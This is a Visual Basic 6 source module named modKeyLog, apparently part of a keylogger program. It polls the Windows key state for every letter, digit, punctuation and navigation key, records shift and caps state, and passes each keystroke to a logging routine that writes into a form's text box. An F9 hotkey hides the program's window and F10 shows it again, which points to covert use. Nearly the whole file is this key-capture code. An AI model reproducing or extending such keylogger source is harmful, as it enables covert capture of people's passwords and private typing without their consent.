Attribute VB_Name = "modKeyLog"
Option Explicit

Public Declare Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, nSize As Long) As Long
Public Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Public Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As Long) As Integer

Public Declare Function PostMessage Lib "user32" Alias "PostMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Public Declare Sub keybd_event Lib "user32" (ByVal bVk As Byte, ByVal bScan As Byte, ByVal dwFlags As Long, ByVal dwExtraInfo As Long)

Public Const VK_BACK = &H8 'BACKSPACE key
Public Const VK_TAB = &H9 'TAB key
Public Const VK_PAUSE = &H13 'PAUSE key
Public Const VK_RETURN = &HD  'ENTER key
Public Const VK_SHIFT = &H10 'SHIFT key
Public Const VK_CAPITAL = &H14 'CAPS LOCK key
Public Const VK_SPACE = &H20 'SPACEBAR
Public Const VK_END = &H23 'END key
Public Const VK_HOME = &H24 'HOME key
Public Const VK_LEFT = &H25 'LEFT ARROW key
Public Const VK_UP = &H26 'UP ARROW key
Public Const VK_RIGHT = &H27 'RIGHT ARROW key
Public Const VK_DOWN = &H28 'DOWN ARROW key
Public Const VK_PRINT = &H2A 'PRINT key
Public Const VK_INSERT = &H2D 'INS key
Public Const VK_DELETE = &H2E 'DEL key
Public Const VK_Key_0 = &H30 '0 key
Public Const VK_Key_1 = &H31 '1 key
Public Const VK_Key_2 = &H32 '2 key
Public Const VK_Key_3 = &H33 '3 key
Public Const VK_Key_4 = &H34 '4 key
Public Const VK_Key_5 = &H35 '5 key
Public Const VK_Key_6 = &H36 '6 key
Public Const VK_Key_7 = &H37 '7 key
Public Const VK_Key_8 = &H38 '8 key
Public Const VK_Key_9 = &H39 '9 key
 '—  3A–40  'Undefined
Public Const VK_Key_A = &H41 'A key
Public Const VK_Key_B = &H42 'B key
Public Const VK_Key_C = &H43 'C key
Public Const VK_Key_D = &H44 'D key
Public Const VK_Key_E = &H45 'E key
Public Const VK_Key_F = &H46 'F key
Public Const VK_Key_G = &H47 'G key
Public Const VK_Key_H = &H48 'H key
Public Const VK_Key_I = &H49 'I key
Public Const VK_Key_J = &H4A 'J key
Public Const VK_Key_K = &H4B 'K key
Public Const VK_Key_L = &H4C 'L key
Public Const VK_Key_M = &H4D 'M key
Public Const VK_Key_N = &H4E 'N key
Public Const VK_Key_O = &H4F 'O key
Public Const VK_Key_P = &H50 'P key
Public Const VK_Key_Q = &H51 'Q key
Public Const VK_Key_R = &H52 'R key
Public Const VK_Key_S = &H53 'S key
Public Const VK_Key_T = &H54 'T key
Public Const VK_Key_U = &H55 'U key
Public Const VK_Key_V = &H56 'V key
Public Const VK_Key_W = &H57 'W key
Public Const VK_Key_X = &H58 'X key
Public Const VK_Key_Y = &H59 'Y key
Public Const VK_Key_Z = &H5A 'Z key

'Public Const VK_PERIOD = &H2E ' . key
'Public Const VK_COMMA = &H2C ' , key
'Public Const VK_HYPHEN = &H2D ' - key
'Public Const VK_FORWARD_SLASH = &H2F ' / key
'Public Const VK_SINGLE_APOSTROPHE = &H27 ' ' key
'Public Const VK_DOUBLE_APOSTROPHE = &H23 ' " key
'Public Const VK_BACK_SLASH = &H34 ' \ key


Public Const VK_NUMPAD0 = &H60 'Numeric keypad 0 key
Public Const VK_NUMPAD1 = &H61 'Numeric keypad 1 key
Public Const VK_NUMPAD2 = &H62 'Numeric keypad 2 key
Public Const VK_NUMPAD3 = &H63 'Numeric keypad 3 key
Public Const VK_NUMPAD4 = &H64 'Numeric keypad 4 key
Public Const VK_NUMPAD5 = &H65 'Numeric keypad 5 key
Public Const VK_NUMPAD6 = &H66 'Numeric keypad 6 key
Public Const VK_NUMPAD7 = &H67 'Numeric keypad 7 key
Public Const VK_NUMPAD8 = &H68 'Numeric keypad 8 key
Public Const VK_NUMPAD9 = &H69 'Numeric keypad 9 key
Public Const VK_MULTIPLY = &H6A 'Multiply key
Public Const VK_ADD = &H6B 'Add key
Public Const VK_SEPARATOR = &H6C 'Separator key
Public Const VK_SUBTRACT = &H6D 'Subtract key
Public Const VK_DECIMAL = &H6E 'Decimal key
Public Const VK_DIVIDE = &H6F
Public Const VK_F1 = &H70 'F1 key
Public Const VK_F2 = &H71 'F2 key
Public Const VK_F3 = &H72 'F3 key
Public Const VK_F4 = &H73 'F4 key
Public Const VK_F5 = &H74 'F5 key
Public Const VK_F6 = &H75 'F6 key
Public Const VK_F7 = &H76 'F7 key
Public Const VK_F8 = &H77 'F8 key
Public Const VK_F9 = &H78 'F9 key
Public Const VK_F10 = &H79 'F10 key
Public Const VK_F11 = &H7A 'F11 key
Public Const VK_F12 = &H7B 'F12 key
Public Const VK_F13 = &H7C 'F13 key
Public Const VK_F14 = &H7D 'F14 key
Public Const VK_F15 = &H7E 'F15 key
Public Const VK_F16 = &H7F 'F16 key
Public Const VK_LSHIFT = &HA0 'Left SHIFT key
Public Const VK_RSHIFT = &HA1 'Right SHIFT key

Public ShiftKey As Boolean
Public CapsKey As Boolean
Public spChars(9) As String


Public Function GetCapsState() As Boolean
If GetAsyncKeyState(VK_CAPITAL) Then
    GetCapsState = True
Else
    GetCapsState = False
End If
'If GetKeyState(vbKeyCapital) = 1 Then
'GetCapsState = True
'Else
'GetCapsState = False
'End If
End Function

Public Function GetShiftState() As Boolean
If GetAsyncKeyState(VK_SHIFT) Then
    GetShiftState = True
Else
    GetShiftState = False
End If
'If GetAsyncKeyState(vbKeyShift) = -32767 Or GetAsyncKeyState(vbKeyShift) = -32768 Then
'GetShiftState = True
'Else
'GetShiftState = False
'End If
End Function

'Public Sub PollKeyboard()
'Dim KeyCheck As Integer
'Dim t As Long
'
'For t = 48 To 57
'    If GetAsyncKeyState(vbKeyShift) < 0 Then
'        If CheckForKey(t, a(t - 48)) Then Exit Sub
'    Else
'        If CheckForKey(t, Chr$(t)) Then Exit Sub
'    End If
'Next t
'For t = 65 To 90
'    If GetAsyncKeyState(vbKeyShift) < 0 Then
'        If CheckForKey(t, Chr$(t)) Then Exit Sub
'    Else
'        If CheckForKey(t, Chr$(t + 32)) Then Exit Sub
'    End If
'Next t
'For t = 96 To 105
'    If CheckForKey(t, t - 96) Then Exit Sub
'Next t
'If CheckForKey(106, "*") Then Exit Sub
'If CheckForKey(107, "+") Then Exit Sub
'If CheckForKey(108, vbCrLf) Then Exit Sub
'If CheckForKey(109, "-") Then Exit Sub
'If CheckForKey(110, ".") Then Exit Sub
'If CheckForKey(VK_DIVIDE, "/") Then Exit Sub
'If CheckForKey(8, "[<-]") Then Exit Sub
'If CheckForKey(9, "[TAB]") Then Exit Sub
'If CheckForKey(13, vbCrLf) Then Exit Sub
'If CheckForKey(16, "[SHIFT]") Then Exit Sub
'If CheckForKey(17, "[CTRL]") Then Exit Sub
'If CheckForKey(18, "[ALT]") Then Exit Sub
'If CheckForKey(VK_PAUSE, "[PAUSE]") Then Exit Sub
'If CheckForKey(27, "[ESC]") Then Exit Sub
'If CheckForKey(33, "[PAGE UP]") Then Exit Sub
'If CheckForKey(34, "[PAGE DOWN]") Then Exit Sub
'If CheckForKey(35, "[END]") Then Exit Sub
'If CheckForKey(36, "[HOME]") Then Exit Sub
'
'If True Then
'    If CheckForKey(37, "[LEFT]") Then Exit Sub
'    If CheckForKey(38, "[UP]") Then Exit Sub
'    If CheckForKey(39, "[RIGHT]") Then Exit Sub
'    If CheckForKey(40, "[DOWN]") Then Exit Sub
'End If
'
'If CheckForKey(44, "[PRINTSCR]") Then Exit Sub
'If CheckForKey(45, "[INSERT]") Then Exit Sub
'If CheckForKey(46, "[DEL]") Then Exit Sub
'If CheckForKey(144, "[NUM]") Then Exit Sub
'If CheckForKey(145, "[SCROLL]") Then Exit Sub
'If CheckForKey(32, " ") Then Exit Sub
'
'For t = 112 To 127
' If CheckForKey(t, "[F" & CStr(t - 111) & "]") Then Exit Sub
'Next t
'
'If GetAsyncKeyState(vbKeyShift) < 0 Then
'    If CheckForKey(186, ":") Then Exit Sub
'    If CheckForKey(187, "+") Then Exit Sub
'    If CheckForKey(188, "<") Then Exit Sub
'    If CheckForKey(189, "_") Then Exit Sub
'    If CheckForKey(190, ">") Then Exit Sub
'    If CheckForKey(191, "?") Then Exit Sub
'    If CheckForKey(192, "~") Then Exit Sub
'    If CheckForKey(220, "|") Then Exit Sub
'    If CheckForKey(222, Chr$(34)) Then Exit Sub
'    If CheckForKey(221, "}") Then Exit Sub
'    If CheckForKey(219, "{") Then Exit Sub
'Else
'    If CheckForKey(186, ";") Then Exit Sub
'    If CheckForKey(187, "=") Then Exit Sub
'    If CheckForKey(188, ",") Then Exit Sub
'    If CheckForKey(189, "-") Then Exit Sub
'    If CheckForKey(190, ".") Then Exit Sub
'    If CheckForKey(191, "/") Then Exit Sub
'    If CheckForKey(192, "`") Then Exit Sub
'    If CheckForKey(220, "\") Then Exit Sub
'    If CheckForKey(222, "'") Then Exit Sub
'    If CheckForKey(221, "]") Then Exit Sub
'    If CheckForKey(219, "[") Then Exit Sub
'End If
'End Sub
'
'
'Public Function CheckForKey(ByVal KeyCode As Long, ByVal KeyChar As String) As Boolean
'    Dim Result%
'    Result = GetAsyncKeyState(KeyCode)
'    If Result = -32767 Then
'        Call AddToLog("Key Pressed:" & KeyChar)
'        CheckForKey = True
'    Else
'        CheckForKey = False
'    End If
'End Function

Public Function AddToLog(ByVal key As String) As Boolean
   frmMain.txtActivityLog.Text = frmMain.txtActivityLog.Text & key & vbCrLf
End Function


Public Sub PollForKeyboardInputs()
ShiftKey = GetShiftState
CapsKey = GetCapsState
If GetAsyncKeyState(VK_F9) Then
    Call ShowWindow(frmMain.hwnd, SW_HIDE)
    Exit Sub
End If
If GetAsyncKeyState(VK_F10) Then
   Call ShowWindow(frmMain.hwnd, SW_NORMAL)
   Exit Sub
End If
'''CHECK FOR NAVIGATION KEYS
If PollNavigationKeys() Then Exit Sub
DoEvents
'''CHECK FOR NUMBER KEYS
If PollNumericKeys() Then Exit Sub
DoEvents
''''CHECK FOR ALHABET KEYS
If PollAlphabetKeys() Then Exit Sub
DoEvents
'''CHECK FOR NUMPAD KEYS
If PollNumpadKeys() Then Exit Sub
DoEvents
'''CHECK FOR PUNCTUATION KEYS
If PollPunctuationKeys() Then Exit Sub
DoEvents
Call LogKey(Chr(vbNull))
End Sub

Public Function PollPunctuationKeys() As Boolean
If GetAsyncKeyState(186) Then
    If Not ShiftKey Then
        Call LogKey(";")
    Else
        Call LogKey(":")
    End If
    PollPunctuationKeys = True
End If
If GetAsyncKeyState(187) Then
    If Not ShiftKey Then
        Call LogKey("=")
    Else
        Call LogKey("+")
    End If
    PollPunctuationKeys = True
End If
If GetAsyncKeyState(188) Then
    If Not ShiftKey Then
        Call LogKey(",")
    Else
        Call LogKey("<")
    End If
    PollPunctuationKeys = True
End If
If GetAsyncKeyState(189) Then
    If Not ShiftKey Then
        Call LogKey("-")
    Else
        Call LogKey("_")
    End If
    PollPunctuationKeys = True
End If
If GetAsyncKeyState(190) Then
    If Not ShiftKey Then
        Call LogKey(".")
    Else
        Call LogKey(">")
    End If
    PollPunctuationKeys = True
End If
If GetAsyncKeyState(191) Then
    If Not ShiftKey Then
        Call LogKey("/")
    Else
        Call LogKey("?")
    End If
    PollPunctuationKeys = True
End If
If GetAsyncKeyState(192) Then
    If Not ShiftKey Then
        Call LogKey("`")
    Else
        Call LogKey("~")
    End If
    PollPunctuationKeys = True
End If
If GetAsyncKeyState(219) Then
    If Not ShiftKey Then
        Call LogKey("[")
    Else
        Call LogKey("{")
    End If
    PollPunctuationKeys = True
End If
If GetAsyncKeyState(220) Then
    If Not ShiftKey Then
        Call LogKey("\")
    Else
        Call LogKey("|")
    End If
    PollPunctuationKeys = True
End If
If GetAsyncKeyState(221) Then
    If Not ShiftKey Then
        Call LogKey("]")
    Else
        Call LogKey("}")
    End If
    PollPunctuationKeys = True
End If
If GetAsyncKeyState(222) Then
    If Not ShiftKey Then
        Call LogKey("'")
    Else
        Call LogKey(Chr(34))
    End If
    PollPunctuationKeys = True
End If
PollPunctuationKeys = False
End Function

Public Function PollNumpadKeys() As Boolean
If GetAsyncKeyState(vbKeyNumlock) Then
    If GetAsyncKeyState(VK_NUMPAD0) Then
        Call LogKey(Chr(VK_NUMPAD0))
        PollNumpadKeys = True
    End If
    If GetAsyncKeyState(VK_NUMPAD1) Then
        Call LogKey(Chr(VK_NUMPAD1))
        PollNumpadKeys = True
    End If
    If GetAsyncKeyState(VK_NUMPAD2) Then
        Call LogKey(Chr(VK_NUMPAD2))
        PollNumpadKeys = True
    End If
    If GetAsyncKeyState(VK_NUMPAD3) Then
        Call LogKey(Chr(VK_NUMPAD3))
        PollNumpadKeys = True
    End If
    If GetAsyncKeyState(VK_NUMPAD4) Then
        Call LogKey(Chr(VK_NUMPAD4))
        PollNumpadKeys = True
    End If
    If GetAsyncKeyState(VK_NUMPAD5) Then
        Call LogKey(Chr(VK_NUMPAD5))
        PollNumpadKeys = True
    End If
    If GetAsyncKeyState(VK_NUMPAD6) Then
        Call LogKey(Chr(VK_NUMPAD6))
        PollNumpadKeys = True
    End If
    If GetAsyncKeyState(VK_NUMPAD7) Then
        Call LogKey(Chr(VK_NUMPAD7))
        PollNumpadKeys = True
    End If
    If GetAsyncKeyState(VK_NUMPAD8) Then
        Call LogKey(Chr(VK_NUMPAD8))
        PollNumpadKeys = True
    End If
    If GetAsyncKeyState(VK_NUMPAD9) Then
        Call LogKey(Chr(VK_NUMPAD9))
        PollNumpadKeys = True
    End If
    PollNumpadKeys = True
End If
If GetAsyncKeyState(VK_MULTIPLY) Then
    Call LogKey(Chr(VK_MULTIPLY))
    PollNumpadKeys = True
End If
If GetAsyncKeyState(VK_SEPARATOR) Then
    Call LogKey(Chr(VK_SEPARATOR))
    PollNumpadKeys = True
End If
If GetAsyncKeyState(VK_SUBTRACT) Then
    Call LogKey(Chr(VK_SUBTRACT))
    PollNumpadKeys = True
End If
If GetAsyncKeyState(VK_ADD) Then
    Call LogKey(Chr(VK_ADD))
    PollNumpadKeys = True
End If
If GetAsyncKeyState(VK_DIVIDE) Then
    Call LogKey(Chr(VK_DIVIDE))
    PollNumpadKeys = True
End If
If GetAsyncKeyState(VK_DECIMAL) Then
    Call LogKey(Chr(VK_DECIMAL))
    PollNumpadKeys = True
End If
PollNumpadKeys = False
End Function

Public Function PollAlphabetKeys() As Boolean
If GetAsyncKeyState(VK_Key_A) Then
    If (CapsKey = True And ShiftKey = False) Or (CapsKey = False And ShiftKey = True) Then
        Call LogKey(Chr(VK_Key_A))
    Else
        Call LogKey(LCase(Chr(VK_Key_A)))
    End If
    PollAlphabetKeys = True
End If
If GetAsyncKeyState(VK_Key_B) Then
    If (CapsKey = True And ShiftKey = False) Or (CapsKey = False And ShiftKey = True) Then
        Call LogKey(Chr(VK_Key_B))
    Else
        Call LogKey(LCase(Chr(VK_Key_B)))
    End If
    PollAlphabetKeys = True
End If
If GetAsyncKeyState(VK_Key_C) Then
    If (CapsKey = True And ShiftKey = False) Or (CapsKey = False And ShiftKey = True) Then
        Call LogKey(Chr(VK_Key_C))
    Else
        Call LogKey(LCase(Chr(VK_Key_C)))
    End If
    PollAlphabetKeys = True
End If
If GetAsyncKeyState(VK_Key_D) Then
    If (CapsKey = True And ShiftKey = False) Or (CapsKey = False And ShiftKey = True) Then
        Call LogKey(Chr(VK_Key_D))
    Else
        Call LogKey(LCase(Chr(VK_Key_D)))
    End If
    PollAlphabetKeys = True
End If
If GetAsyncKeyState(VK_Key_E) Then
    If (CapsKey = True And ShiftKey = False) Or (CapsKey = False And ShiftKey = True) Then
        Call LogKey(Chr(VK_Key_E))
    Else
        Call LogKey(LCase(Chr(VK_Key_E)))
    End If
    PollAlphabetKeys = True
End If
If GetAsyncKeyState(VK_Key_F) Then
    If (CapsKey = True And ShiftKey = False) Or (CapsKey = False And ShiftKey = True) Then
        Call LogKey(Chr(VK_Key_F))
    Else
        Call LogKey(LCase(Chr(VK_Key_F)))
    End If
    PollAlphabetKeys = True
End If
If GetAsyncKeyState(VK_Key_G) Then
    If (CapsKey = True And ShiftKey = False) Or (CapsKey = False And ShiftKey = True) Then
        Call LogKey(Chr(VK_Key_G))
    Else
        Call LogKey(LCase(Chr(VK_Key_G)))
    End If
    PollAlphabetKeys = True
End If
If GetAsyncKeyState(VK_Key_H) Then
    If (CapsKey = True And ShiftKey = False) Or (CapsKey = False And ShiftKey = True) Then
        Call LogKey(Chr(VK_Key_H))
    Else
        Call LogKey(LCase(Chr(VK_Key_H)))
    End If
    PollAlphabetKeys = True
End If
If GetAsyncKeyState(VK_Key_I) Then
    If (CapsKey = True And ShiftKey = False) Or (CapsKey = False And ShiftKey = True) Then
        Call LogKey(Chr(VK_Key_I))
    Else
        Call LogKey(LCase(Chr(VK_Key_I)))
    End If
    PollAlphabetKeys = True
End If
If GetAsyncKeyState(VK_Key_J) Then
    If (CapsKey = True And ShiftKey = False) Or (CapsKey = False And ShiftKey = True) Then
        Call LogKey(Chr(VK_Key_J))
    Else
        Call LogKey(LCase(Chr(VK_Key_J)))
    End If
    PollAlphabetKeys = True
End If
If GetAsyncKeyState(VK_Key_K) Then
    If (CapsKey = True And ShiftKey = False) Or (CapsKey = False And ShiftKey = True) Then
        Call LogKey(Chr(VK_Key_K))
    Else
        Call LogKey(LCase(Chr(VK_Key_K)))
    End If
    PollAlphabetKeys = True
End If
If GetAsyncKeyState(VK_Key_L) Then
    If (CapsKey = True And ShiftKey = False) Or (CapsKey = False And ShiftKey = True) Then
        Call LogKey(Chr(VK_Key_L))
    Else
        Call LogKey(LCase(Chr(VK_Key_L)))
    End If
    PollAlphabetKeys = True
End If
If GetAsyncKeyState(VK_Key_M) Then
    If (CapsKey = True And ShiftKey = False) Or (CapsKey = False And ShiftKey = True) Then
        Call LogKey(Chr(VK_Key_M))
    Else
        Call LogKey(LCase(Chr(VK_Key_M)))
    End If
    PollAlphabetKeys = True
End If
If GetAsyncKeyState(VK_Key_N) Then
    If (CapsKey = True And ShiftKey = False) Or (CapsKey = False And ShiftKey = True) Then
    Call LogKey(Chr(VK_Key_N))
    Else
        Call LogKey(LCase(Chr(VK_Key_N)))
    End If
    PollAlphabetKeys = True
End If
If GetAsyncKeyState(VK_Key_O) Then
    If (CapsKey = True And ShiftKey = False) Or (CapsKey = False And ShiftKey = True) Then
    Call LogKey(Chr(VK_Key_O))
    Else
        Call LogKey(LCase(Chr(VK_Key_O)))
    End If
    PollAlphabetKeys = True
End If
If GetAsyncKeyState(VK_Key_P) Then
    If (CapsKey = True And ShiftKey = False) Or (CapsKey = False And ShiftKey = True) Then
    Call LogKey(Chr(VK_Key_P))
    Else
        Call LogKey(LCase(Chr(VK_Key_P)))
    End If
    PollAlphabetKeys = True
End If
If GetAsyncKeyState(VK_Key_Q) Then
    If (CapsKey = True And ShiftKey = False) Or (CapsKey = False And ShiftKey = True) Then
    Call LogKey(Chr(VK_Key_Q))
    Else
        Call LogKey(LCase(Chr(VK_Key_Q)))
    End If
    PollAlphabetKeys = True
End If
If GetAsyncKeyState(VK_Key_R) Then
    If (CapsKey = True And ShiftKey = False) Or (CapsKey = False And ShiftKey = True) Then
    Call LogKey(Chr(VK_Key_R))
    Else
        Call LogKey(LCase(Chr(VK_Key_R)))
    End If
    PollAlphabetKeys = True
End If
If GetAsyncKeyState(VK_Key_S) Then
    If (CapsKey = True And ShiftKey = False) Or (CapsKey = False And ShiftKey = True) Then
    Call LogKey(Chr(VK_Key_S))
    Else
        Call LogKey(LCase(Chr(VK_Key_S)))
    End If
    PollAlphabetKeys = True
End If
If GetAsyncKeyState(VK_Key_T) Then
    If (CapsKey = True And ShiftKey = False) Or (CapsKey = False And ShiftKey = True) Then
    Call LogKey(Chr(VK_Key_T))
    Else
        Call LogKey(LCase(Chr(VK_Key_T)))
    End If
    PollAlphabetKeys = True
End If
If GetAsyncKeyState(VK_Key_U) Then
    If (CapsKey = True And ShiftKey = False) Or (CapsKey = False And ShiftKey = True) Then
    Call LogKey(Chr(VK_Key_U))
    Else
        Call LogKey(LCase(Chr(VK_Key_U)))
    End If
    PollAlphabetKeys = True
End If
If GetAsyncKeyState(VK_Key_V) Then
    If (CapsKey = True And ShiftKey = False) Or (CapsKey = False And ShiftKey = True) Then
    Call LogKey(Chr(VK_Key_V))
    Else
        Call LogKey(LCase(Chr(VK_Key_V)))
    End If
    PollAlphabetKeys = True
End If
If GetAsyncKeyState(VK_Key_W) Then
    If (CapsKey = True And ShiftKey = False) Or (CapsKey = False And ShiftKey = True) Then
    Call LogKey(Chr(VK_Key_W))
    Else
        Call LogKey(LCase(Chr(VK_Key_W)))
    End If
    PollAlphabetKeys = True
End If
If GetAsyncKeyState(VK_Key_X) Then
    If (CapsKey = True And ShiftKey = False) Or (CapsKey = False And ShiftKey = True) Then
        Call LogKey(Chr(VK_Key_X))
    Else
        Call LogKey(LCase(Chr(VK_Key_X)))
    End If
    PollAlphabetKeys = True
End If
If GetAsyncKeyState(VK_Key_Y) Then
    If (CapsKey = True And ShiftKey = False) Or (CapsKey = False And ShiftKey = True) Then
        Call LogKey(Chr(VK_Key_Y))
    Else
        Call LogKey(LCase(Chr(VK_Key_Y)))
    End If
    PollAlphabetKeys = True
End If
If GetAsyncKeyState(VK_Key_Z) Then
    If (CapsKey = True And ShiftKey = False) Or (CapsKey = False And ShiftKey = True) Then
        Call LogKey(Chr(VK_Key_Z))
    Else
        Call LogKey(LCase(Chr(VK_Key_Z)))
    End If
    PollAlphabetKeys = True
End If
PollAlphabetKeys = False
End Function

Public Function PollNumericKeys() As Boolean
If GetAsyncKeyState(VK_Key_0) Then
    If Not ShiftKey Then
        Call LogKey(Chr(VK_Key_0))
    Else
        Call LogKey(")")
    End If
    PollNumericKeys = True
End If
If GetAsyncKeyState(VK_Key_1) Then
    If Not ShiftKey Then
        Call LogKey(Chr(VK_Key_1))
    Else
        Call LogKey("!")
    End If
    PollNumericKeys = True
End If
If GetAsyncKeyState(VK_Key_2) Then
    If Not ShiftKey Then
    Call LogKey(Chr(VK_Key_2))
    Else
        Call LogKey("@")
    End If
    PollNumericKeys = True
End If

If GetAsyncKeyState(VK_Key_3) Then
    If Not ShiftKey Then
    Call LogKey(Chr(VK_Key_3))
    Else
        Call LogKey("#")
    End If
    PollNumericKeys = True
End If
If GetAsyncKeyState(VK_Key_4) Then
    If Not ShiftKey Then
    Call LogKey(Chr(VK_Key_4))
    Else
        Call LogKey("$")
    End If
    PollNumericKeys = True
End If
If GetAsyncKeyState(VK_Key_5) Then
    If Not ShiftKey Then
    Call LogKey(Chr(VK_Key_5))
    Else
        Call LogKey("%")
    End If
    PollNumericKeys = True
End If
If GetAsyncKeyState(VK_Key_6) Then
    If Not ShiftKey Then
    Call LogKey(Chr(VK_Key_6))
    Else
        Call LogKey("^")
    End If
    PollNumericKeys = True
End If
If GetAsyncKeyState(VK_Key_7) Then
    If Not ShiftKey Then
    Call LogKey(Chr(VK_Key_7))
    Else
        Call LogKey("&")
    End If
    PollNumericKeys = True
End If
If GetAsyncKeyState(VK_Key_8) Then
    If Not ShiftKey Then
    Call LogKey(Chr(VK_Key_8))
    Else
        Call LogKey("*")
    End If
    PollNumericKeys = True
End If
If GetAsyncKeyState(VK_Key_9) Then
    If Not ShiftKey Then
        Call LogKey(Chr(VK_Key_9))
    Else
        Call LogKey("(")
    End If
    PollNumericKeys = True
End If
PollNumericKeys = False
End Function

Public Function PollNavigationKeys() As Boolean
If GetAsyncKeyState(VK_BACK) Then
   Call LogKey("[BACKSPACE]")
   PollNavigationKeys = True
End If
If GetAsyncKeyState(VK_TAB) Then
    If Not ShiftKey Then
        'Call LogKey(Chr(VK_TAB))
        Call LogKey("[TAB-->]")
    Else
        Call LogKey("[<--TAB]")
    End If
    PollNavigationKeys = True
End If
'If GetAsyncKeyState(VK_PAUSE) Then
'    Call LogKey(VK_PAUSE)
'End If
If GetAsyncKeyState(VK_RETURN) Then
    Call LogKey(Chr(VK_RETURN))
    PollNavigationKeys = True
End If
If GetAsyncKeyState(VK_SPACE) Then
    Call LogKey(Chr(VK_SPACE))
    PollNavigationKeys = True
End If
DoEvents
If GetAsyncKeyState(VK_END) Then
     Call LogKey("[END]")
     PollNavigationKeys = True
End If
If GetAsyncKeyState(VK_HOME) Then
     Call LogKey("[HOME]")
     PollNavigationKeys = True
End If
DoEvents
If GetAsyncKeyState(VK_LEFT) Then
    Call LogKey("[LEFT]")
    PollNavigationKeys = True
End If
If GetAsyncKeyState(VK_UP) Then
    Call LogKey("[UP]")
    PollNavigationKeys = True
End If
If GetAsyncKeyState(VK_RIGHT) Then
    Call LogKey("[RIGHT]")
    PollNavigationKeys = True
End If
If GetAsyncKeyState(VK_DOWN) Then
    Call LogKey("[DOWN]")
    PollNavigationKeys = True
End If
If GetAsyncKeyState(VK_INSERT) Then
    Call LogKey("[INSERT]")
    PollNavigationKeys = True
End If
If GetAsyncKeyState(VK_PRINT) Then
    Call LogKey("[PRINT]")
    PollNavigationKeys = True
End If
If GetAsyncKeyState(VK_DELETE) Then
    Call LogKey("[DEL]")
    PollNavigationKeys = True
End If
PollNavigationKeys = False
End Function
